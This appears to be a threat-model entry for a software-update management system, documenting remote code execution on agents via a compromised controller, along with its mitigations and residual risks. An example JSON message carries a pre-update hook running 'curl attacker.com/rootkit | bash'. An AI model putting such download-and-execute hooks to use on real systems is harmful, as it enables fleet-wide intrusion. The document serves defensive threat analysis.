# ATK-17: RCE on Agents via Compromised Controller

| Field | Value |
| --- | --- |
| Severity | Critical |
| Attack surface | Controller / wire protocol |
| Prerequisites | Compromise of the controller or ability to inject `ControllerMessage` payloads |
| STRIDE | Elevation of Privilege |

## Attack description

1. The attacker compromises the controller through any means: direct access to the
   controller host, database access to modify settings, forged JWT with `owner`
   permissions (via [ATK-03](03-master-key-compromise.md)), or NATS message injection.
2. The attacker crafts an `ExecuteUpdate` message with malicious `pre_update_hooks`
   or `post_update_hooks`:

   ```json
   {
     "type": "execute_update",
     "host_machine_id": "<target_host>",
     "update_history_id": "<uuid>",
     "software_item_id": "<uuid>",
     "to_version": "1.0.0",
     "execute_update_plugin": { "plugin_type": "generic_shell", "config": {} },
     "pre_update_hooks": [
       {
         "type": "shell",
         "command": "curl attacker.com/rootkit | bash",
         "shell": "bash"
       }
     ]
   }
   ```

3. The controller sends this message to the target agent over the mTLS WebSocket.
4. The agent's `run_hook_command()` executes the shell command via
   `bash -c "set -euo pipefail\ncurl attacker.com/rootkit | bash"`.

The same attack applies via:

- **`ExecuteBatchUpdate`** — carries the same `pre_update_hooks` and
  `post_update_hooks` fields.
- **`CheckVersions`** — does not carry hooks directly, but the `PluginAssignment`
  config JSON is passed to the plugin constructor. A malicious config for the
  `generic_shell` plugin type contains `version_command` which is executed as a
  shell command.
- **`DiscoverSoftware`** — similarly passes plugin config to the discovery plugin.

## Worst-case impact

- **Arbitrary code execution on every managed host.** The controller communicates with
  all enrolled agents. A compromised controller can send malicious payloads to every
  agent simultaneously.
- **Root-level compromise.** On hosts where the agent has sudo access, the attacker
  achieves root. The SSH agent extends this to remote hosts via SSH sessions.
- **Fleet-wide rootkit deployment.** The attacker uses the update pipeline to deploy
  persistent backdoors across the entire managed infrastructure in a single operation.
- **Undetectable compromise.** Since the agent trusts the controller by design, there
  are no application-level alerts when the controller sends unexpected commands. The
  agent logs the commands at `info` level but does not flag anomalies.

## Current mitigations

- **mTLS between controller and agents.** The WebSocket connection is authenticated
  with ECDSA P-256 client certificates. An attacker cannot inject messages without
  either compromising the controller or forging the controller's server certificate.
- **Sequence-number validation.** Every message carries a monotonically increasing
  `seq` field. An attacker who hijacks the WebSocket cannot replay old messages or
  inject messages with incorrect sequence numbers.
- **Protocol version gating.** Messages with an unexpected `protocol_version` cause
  immediate connection termination.
- **1 MB message size limit.** WebSocket messages exceeding 1 MB are rejected at the
  transport layer, limiting the size of injected payloads.
- **`host_machine_id` routing guard.** The agent validates that the
  `host_machine_id` matches its own. A compromised controller must know the target
  host's machine ID (easily obtained from the database).
- **Controller access protection.** The controller is protected by HTTPS, JWT
  authentication, RBAC permissions, and rate limiting. Multiple layers must be
  breached to reach the message injection point.
- **Agent-side execution freeze file.** *(Implemented)* Both the `uptrakit-agent`
  and `uptrakit-agent-ssh` binaries check for the presence of a freeze file at
  `<state-dir>/update-freeze` before processing any `ExecuteUpdate` or
  `ExecuteBatchUpdate` message. If the file exists the message is silently
  dropped and the operation is logged. Creating this file (`touch
  <state-dir>/update-freeze`) allows an operator to halt update execution from the
  agent side, independently of and without modifying the controller, while the
  WebSocket connection and all other agent functionality remain active. The freeze
  applies immediately with no restart required.
- **SSH agent batch update handler.** *(Implemented)* The SSH agent now explicitly
  handles `ExecuteBatchUpdate` messages with the same freeze file check
  as `ExecuteUpdate`. Previously, batch update messages were silently dropped by the
  wildcard `_ =>` arm.
- **Per-hook timeout.** *(Implemented)* Individual pre/post-update hooks have a
  5-minute timeout (`HOOK_TIMEOUT = 300s`). A single hook cannot consume the entire
  update timeout budget. On timeout, the hook is killed (via `kill_on_drop(true)`)
  and `UpdateError::HookFailed` is returned. See `crates/shared/agent-core/src/update.rs`.
- **Agent-side update rate limiting.** *(Implemented)* Both agents enforce an
  `UPDATE_COOLDOWN` of 5 seconds between consecutive update executions. For the SSH
  agent, cooldown is tracked per-host. Rapid-fire updates from a compromised
  controller are rejected with a `security_audit:` warning.
- **Remote freeze via `SetUpdateFreeze` wire message.** *(Implemented)* The
  controller can remotely create or remove the freeze file on agents via the
  `set_update_freeze` message. When `enabled: true`, the agent creates the freeze
  file; when `false`, it removes it. The optional `reason` field is logged. This
  removes the requirement for local shell access during an incident.
- **REST API for remote freeze.** *(Implemented)* The
  `POST /api/v1/services/{id}/update-freeze` endpoint allows administrators with
  `manage_agents` permission to enable or disable the update freeze on connected
  agents via the web API or CLI (`uptrakit-cli services update-freeze`). The
  endpoint validates that the service exists, is connected, and sends the wire
  message over the active WebSocket.
- **Hook audit logging.** *(Implemented)* Before executing pre/post-update hooks,
  agents emit a `security_audit:` warning listing the hook count and command
  summaries, enabling forensic analysis of executed commands.
- **`NoopCommandExecutor` returns error instead of panic.** *(Implemented)* The
  controller's `NoopCommandExecutor` (used for API-based plugins that should never
  execute local commands) now returns `CommandError::UnsupportedOperation` instead of
  calling `unreachable!()`. This prevents a controller crash if a code path
  accidentally triggers local execution, converting a potential DoS into a handled
  error.

## Residual risk

- **Agents implicitly trust the controller.** By design, agents execute any command
  received from the authenticated controller. There is no mechanism for agents to
  independently verify command legitimacy or require operator confirmation. The freeze
  file is an emergency stop, not a per-command review mechanism.
- **No command signing.** `ExecuteUpdate` messages are not cryptographically signed
  by the originating admin user. The agent cannot distinguish between commands issued
  by a legitimate admin and commands injected by a compromised controller.
- **NATS message injection.** In HA deployments, `ControllerMessage` variants are
  published to NATS for cross-instance delivery. An attacker with NATS access can
  inject messages into the `uptrakit.events.controller` subject. While
  `ExecuteUpdate` is typically delivered directly via WebSocket (not NATS), other
  messages (e.g., `CaBundleUpdated`, `RequestCertRenewal`) are NATS-delivered and
  could be manipulated.
- **Single trust domain.** The controller is the single root of trust for all agents.
  There is no separation between "command plane" and "data plane" — the same entity
  that manages the software inventory also has full code execution authority.

## Recommended improvements

- Implement cryptographic command signing where `ExecuteUpdate` messages include a
  signature from the originating admin user's credential, allowing agents to verify
  command provenance independently of the controller's TLS identity.
- ~~Add agent-side execution rate limiting~~ — **Implemented.** Both agents enforce a
  5-second cooldown (`UPDATE_COOLDOWN`) between consecutive updates.
- ~~Expose a remote freeze API on the controller~~ — **Implemented.** The
  `POST /api/v1/services/{id}/update-freeze` REST endpoint sends
  `SetUpdateFreeze` wire messages to connected agents, requiring the
  `manage_agents` permission. The CLI exposes this as
  `uptrakit-cli services update-freeze --enable/--disable`. See
  `crates/ui/web-api/src/routes/services.rs` (`set_update_freeze`).
- Add anomaly detection on agents for unusual command patterns (e.g., hooks that
  download and execute external scripts, commands targeting sensitive system files,
  or updates at unusual times).
- Consider implementing command logging with hash-chained integrity (an append-only
  log on the agent that records every command received from the controller), enabling
  forensic analysis after a suspected compromise.
- Document the controller as the critical trust anchor and provide hardening
  guidance: minimal network exposure, dedicated host, immutable infrastructure,
  integrity monitoring.

## References

- [Wire Protocol — Agent-specific messages](../api/wire-protocol.md#agent-specific-controller---service)
- [ATK-16: RCE via Plugin Config Manipulation](16-rce-plugin-config-manipulation.md)
- [ATK-03: Master Key Compromise](03-master-key-compromise.md)
- [Security Architecture](../security/security-architecture.md)
- `crates/shared/wire/src/payloads.rs` — `ExecuteUpdatePayload`
- `crates/shared/wire/src/messages.rs` — `HookCommand`
- `crates/shared/agent-core/src/update.rs` — `run_hook_command()`
- `crates/shared/command/src/command.rs` — `run_command_with_shell()`
- `crates/core/agent/src/main.rs` — freeze file check, rate limiting, and `SetUpdateFreeze` handler
- `crates/core/agent-ssh/src/main.rs` — freeze file check, per-host rate limiting, and `SetUpdateFreeze` handler
